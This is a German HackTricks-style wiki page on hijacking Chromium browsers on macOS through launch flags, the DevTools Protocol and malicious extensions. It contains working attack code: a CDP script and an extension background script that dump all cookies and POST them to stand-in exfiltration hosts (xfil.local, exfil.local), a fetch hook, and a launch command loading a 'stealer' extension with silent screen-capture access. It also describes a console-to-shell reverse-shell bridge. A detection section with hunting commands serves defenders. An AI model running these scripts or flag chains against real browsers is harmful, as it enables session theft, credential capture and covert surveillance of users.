# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Grundlegende Informationen

Chromium-basierte Browser wie Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi und Opera verwenden dieselben Command-Line-Switches, Preference-Dateien und DevTools-Automation-Interfaces. Unter macOS kann jeder Benutzer mit GUI-Zugriff eine bestehende Browser-Sitzung beenden und sie mit beliebigen Flags, Extensions oder DevTools-Endpunkten neu öffnen, die mit den Entitlements des Ziels ausgeführt werden.

#### Chromium mit benutzerdefinierten Flags unter macOS starten

macOS verwaltet eine einzelne UI-Instanz pro Chromium-Profil. Daher muss der Browser für Instrumentierung normalerweise zwangsweise geschlossen werden, beispielsweise mit `osascript -e 'tell application "Google Chrome" to quit'`. Angreifer starten ihn typischerweise über `open -na "Google Chrome" --args <flags>` neu, um Argumente einzuschleusen, ohne das App-Bundle zu ändern. Wird dieser Befehl in einen benutzerdefinierten LaunchAgent (`~/Library/LaunchAgents/*.plist`) oder einen Login-Hook eingebunden, wird sichergestellt, dass der manipulierte Browser nach einem Neustart oder Abmelden erneut gestartet wird.

#### `--load-extension` Flag

Das `--load-extension` Flag lädt nicht gepackte Extensions automatisch (durch Kommas getrennte Pfade). Zusammen mit `--disable-extensions-except` können legitime Extensions blockiert werden, während ausschließlich dein Payload ausgeführt wird. Schädliche Extensions können weitreichende Berechtigungen wie `debugger`, `webRequest` und `cookies` anfordern, um auf DevTools-Protokolle zuzugreifen, CSP-Header zu verändern, HTTPS herabzustufen oder Sitzungsmaterial unmittelbar nach dem Browserstart zu exfiltrieren.

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

Diese Switches stellen das Chrome DevTools Protocol (CDP) über TCP oder eine Pipe bereit, sodass externe Tools den Browser steuern können. Google beobachtete einen weit verbreiteten Missbrauch dieser Schnittstelle durch Infostealer. Seit Chrome 136 (März 2025) werden die Switches für das Standardprofil ignoriert, sofern der Browser nicht mit einem nicht standardmäßigen `--user-data-dir` gestartet wird. Dadurch wird App-Bound Encryption für echte Profile erzwungen. Angreifer können jedoch weiterhin ein frisches Profil starten, das Opfer dazu bringen, sich darin zu authentifizieren (Phishing-/Triage-Unterstützung), und über CDP Cookies, Tokens, Device-Trust-Status oder WebAuthn-Registrierungen abgreifen.<sup>[[5]](#references)</sup>

#### `--user-data-dir` Flag

Dieses Flag leitet das gesamte Browserprofil (History, Cookies, Login Data, Preference-Dateien usw.) in einen von einem Angreifer kontrollierten Pfad um. Es ist erforderlich, wenn moderne Chrome-Builds mit `--remote-debugging-port` kombiniert werden. Außerdem bleibt das manipulierte Profil isoliert, sodass vorab befüllte `Preferences`- oder `Secure Preferences`-Dateien abgelegt werden können, die Sicherheitsabfragen deaktivieren, Extensions automatisch installieren und Standardschemata ändern.

#### `--use-fake-ui-for-media-stream` Flag

Dieser Switch umgeht die Berechtigungsabfrage für Kamera und Mikrofon, sodass jede Seite, die `getUserMedia` aufruft, sofort Zugriff erhält. In Kombination mit Flags wie `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` oder CDP-`Browser.grantPermissions`-Befehlen können Audio und Video, der Desktop oder WebRTC-Berechtigungsprüfungen ohne Benutzerinteraktion unbemerkt erfasst beziehungsweise erfüllt werden.

## In freier Wildbahn beobachtete Delivery- und Relaunch-Muster

CDP-Missbrauch ist häufig eine **post-exploitation**-Phase und nicht der initiale Payload. Eine aktuelle, auf macOS-Entwickler abzielende Kampagne verwendete eine manipulierte Xcode-**`Run Script`-Build-Phase** (`PBXShellScriptBuildPhase`), sodass der Code nur ausgeführt wurde, wenn das Opfer das Projekt **buildete**, nicht bereits beim bloßen Klonen oder Öffnen. Nach dieser ersten Ausführung infizierte die Malware außerdem weitere `.xcodeproj`-Verzeichnisbäume, fügte schädliche Git-`pre-commit`-Hooks hinzu und durchsuchte ZIP-Archive nach weiteren Xcode-Projekten.<sup>[[3]](#references)</sup>

Für den Chromium-Missbrauch ist dies relevant, weil der Angreifer nicht die Browser-Binary selbst patchen muss. Ein kurzlebiger Build-Phase-/`osascript`-Stager kann stattdessen einen **Browser-Wrapper** (LaunchAgent, Login Item, Dock-Eintrag, trojanisierter App-Launcher usw.) installieren, der den legitimen Browser jedes Mal mit vom Angreifer kontrollierten Flags erneut öffnet, wenn der Benutzer ihn startet.<sup>[[3]](#references)</sup>

> [!TIP]
> Untersuche auf Entwickler-Endpunkten `.pbxproj`-Dateien, `.git/hooks/pre-commit` und ZIPs mit `.xcodeproj` auf unerwartete Vorkommen von `curl`, `osascript`, `xxd`, verschachteltem `base64` oder Chrome-Relaunch-Logik.

## Remote Debugging und Missbrauch des DevTools Protocol

Sobald Chrome mit einem eigenen `--user-data-dir` und `--remote-debugging-port` neu gestartet wurde, kann über CDP eine Verbindung hergestellt werden (beispielsweise über `chrome-remote-interface`, `puppeteer` oder `playwright`), um Workflows mit hohen Berechtigungen zu automatisieren:

- **Cookie-/Sitzungsdiebstahl:** `Network.getAllCookies` und `Storage.getCookies` geben HttpOnly-Werte zurück, selbst wenn App-Bound Encryption normalerweise den Dateisystemzugriff blockieren würde, da CDP den laufenden Browser auffordert, sie zu entschlüsseln.
- **Manipulation von Berechtigungen:** Mit `Browser.grantPermissions` und `Emulation.setGeolocationOverride` können Kamera-/Mikrofonabfragen umgangen (insbesondere in Kombination mit `--use-fake-ui-for-media-stream`) oder standortbasierte Sicherheitsprüfungen gefälscht werden.
- **Keystroke-/Script-Injection:** `Runtime.evaluate` führt beliebiges JavaScript innerhalb des aktiven Tabs aus und ermöglicht das Abgreifen von Credentials, das Patchen des DOM oder das Einschleusen von Persistence-Beacons, die Navigationen überdauern.<sup>[[1]](#references)</sup>
- **Live-Exfiltration:** `Network.webRequestWillBeSentExtraInfo` und `Fetch.enable` fangen authentifizierte Requests und Responses in Echtzeit ab, ohne Artefakte auf dem Datenträger zu hinterlassen.
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
Da Chrome 136 CDP im Standardprofil blockiert, liefert das Kopieren des vorhandenen Verzeichnisses `~/Library/Application Support/Google/Chrome` des Opfers in einen Staging-Pfad keine entschlüsselten Cookies mehr. Stattdessen muss der Benutzer dazu gebracht werden, sich innerhalb des instrumentierten Profils zu authentifizieren, z. B. während einer „hilfreichen“ Support-Sitzung, oder MFA-Tokens während der Übertragung über CDP-gesteuerte Network Hooks abgefangen werden.<sup>[[5]](#references)</sup>

### XCSSET-style CDP Backdoor Chain

Ein praktisches Malware-Muster besteht aus folgenden Schritten:

1. Das Userland-Implantat oder der Wrapper wird bei jedem Start von Chrome neu gestartet.
2. Der legitime Browser wird mit `--remote-debugging-port=<port>` und bei Chrome 136+ normalerweise zusätzlich mit einem nicht standardmäßigen, zugeordneten `--user-data-dir=<dir>` gestartet.
3. Ein Helfer wird gestartet, der sich mit dem lokalen CDP WebSocket verbindet und über `Page.addScriptToEvaluateOnNewDocument` einen Pre-Document-Hook registriert.<sup>[[2]](#references)</sup>

Dieser Helfer kann JavaScript **bevor** der Site-Code ausgeführt wird injizieren. Das ist ideal zum Hooking von `window.fetch`, `XMLHttpRequest`, Wallet-Providern oder Autofill-Abläufen, ohne Dateien auf der Festplatte zu patchen.<sup>[[3]](#references)</sup>
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
Eine stärkere Variante verwandelt den Browser in eine **host command bridge**: Injected JavaScript gibt ein mit einem Delimiter versehenes `console.log` aus, der lokale Helfer überwacht `Runtime.consoleAPICalled`, entfernt den Marker, führt den Rest über die Host-Shell aus (beispielsweise mit Go's `exec.Command`) und gibt stdout/stderr über den WebSocket des Angreifers zurück. Dadurch wird die Ausführung von Scripts auf Tab-Ebene zu einer weitgehend dateilosen reverse shell erweitert.<sup>[[3]](#references)</sup>

## Extension-Based Injection via Debugger API

Die 2023 veröffentlichte Forschung "Chrowned by an Extension" zeigte, dass eine bösartige Extension mithilfe der `chrome.debugger` API eine Verbindung zu jedem Tab herstellen und dieselben DevTools-Befugnisse wie `--remote-debugging-port` erlangen kann.<sup>[[6]](#references)</sup> Dadurch werden die ursprünglichen Isolationsannahmen aufgehoben (Extensions bleiben in ihrem Kontext), und es wird Folgendes ermöglicht:

- Unauffälliger Diebstahl von Cookies und Zugangsdaten mit `Network.getAllCookies`/`Fetch.getResponseBody`.
- Änderung von Website-Berechtigungen (Kamera, Mikrofon, Geolokalisierung) und Umgehung von Sicherheitszwischenbildschirmen, wodurch Phishing-Seiten Chrome-Dialoge imitieren können.
- Manipulation von TLS-Warnungen, Downloads oder WebAuthn-Eingabeaufforderungen durch programmgesteuerte Aufrufe von `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` oder `Security.handleCertificateError`.

Lade die Extension mit `--load-extension`/`--disable-extensions-except`, sodass keine Benutzerinteraktion erforderlich ist. Ein minimales Hintergrundskript, das diese API missbraucht, sieht folgendermaßen aus:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
Die Erweiterung kann außerdem `Debugger.paused`-Ereignisse abonnieren, um JavaScript-Variablen zu lesen, Inline-Skripte zu patchen oder benutzerdefinierte Breakpoints zu setzen, die eine Navigation überdauern. Da alles innerhalb der GUI-Sitzung des Benutzers ausgeführt wird, werden Gatekeeper und TCC nicht ausgelöst, wodurch diese Technik ideal für Malware ist, die bereits eine Ausführung im Benutzerkontext erreicht hat.<sup>[[6]](#references)</sup>

## Erkennung & Hunting

- Bei Chromium-Browsern, die mit `--remote-debugging-port`, `--remote-debugging-pipe` oder einem verdächtigen `--user-data-dir` gestartet wurden, einen Alert auslösen, insbesondere wenn der Parent `bash`, `sh`, `osascript`, `xcodebuild` oder ein LaunchAgent-Helfer ist.
- Nach kurzen Ketten suchen, in denen ein Helfer einen lokalen CDP-WebSocket öffnet, `Page.addScriptToEvaluateOnNewDocument` registriert und anschließend eine langlebige ausgehende WebSocket-/HTTPS-Verbindung herstellt.
- Nach Console-to-Shell-Bridges suchen, indem die Browser-Aktivität `Runtime.consoleAPICalled` mit untergeordneten Shells oder Helferprozessen korreliert wird, die vom Angreifer bereitgestellte Befehle ausführen.
- Auf Entwickler-Macs `.pbxproj`-Einträge vom Typ `PBXShellScriptBuildPhase`, Git-`pre-commit`-Hooks, Dock-/Login-Item-Neustarter und ZIP-enthaltene Xcode-Projekte auf die Installation von Browser-Wrappern überprüfen.
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Tools

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - Automatisiert Chromium-Starts mit Payload-Erweiterungen und stellt interaktive CDP-Hooks bereit.
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - Ähnliche Tools mit Fokus auf Traffic-Interception und Browser-Instrumentierung für macOS-Operatoren.
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - Node.js-Bibliothek zum Scripting von Chrome DevTools Protocol-Dumps (Cookies, DOM, Berechtigungen), sobald eine `--remote-debugging-port`-Instanz aktiv ist.

### Example
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Weitere Beispiele findest du in den Links zu den Tools.

## Referenzen

- [1] [Chrome DevTools Protocol - Runtime domain](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [2] [Chrome DevTools Protocol - Page domain](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [3] [The Xcode Assassin Returns: A Deep Dive Into the Latest XCSSET Version - Unit 42](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [4] [Ron Masas (@RonMasas) on X](https://twitter.com/RonMasas/status/1758106347222995007)
- [5] [Changes to remote debugging switches to improve security - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [6] [Chrowned by an Extension: Abusing the Chrome DevTools Protocol through the Debugger API (arXiv:2305.11506)](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
